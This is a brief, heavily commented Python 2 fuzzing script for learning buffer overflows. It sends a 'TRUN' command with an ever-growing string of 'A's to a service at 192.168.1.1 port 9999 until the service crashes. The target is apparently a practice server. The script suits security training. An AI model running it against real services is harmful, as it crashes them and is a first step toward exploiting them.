#!/usr/bin/python
# ------------------------------------------
# ---Made by:   ./1scriptmaker.sh
# ---This is:   bufferOverFlow.py
# ------------------------------------------

# A basic fuzzing script
# Written in python 2


import sys, socket		#import external modules
from time import sleep		#

buffer = "A" * 100		# buffer is simply a string of 100 A's



'''
We establish a connection to an IP at a certain port.
We send a message
If we don't crash the system, we add more to our message.
We send the message again.
Trying to see how big we can make our message, before it crashes. 
'''
while True:		# as long as true, this loop will keep running.
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# Establish connection
		s.connect(('192.168.1.1', 9999)) 	# Connection to this IP, and port
		s.send(('TRUN /.:/' + buffer)) 		# Send this message + buffer (message + 100 A's)
		s.close() 							# Close that connection
		sleep(1) 							# Sleep for a second
		buffer = buffer + "A"*100 			# Append buffer, with another 100 A's  100 --> 200 -->

	except:
		print("Fuzzing crashed at %s bytes" % (str(len(buffer))))
		sys.exit() 	# If we crash, print out where the buffer was at in length.

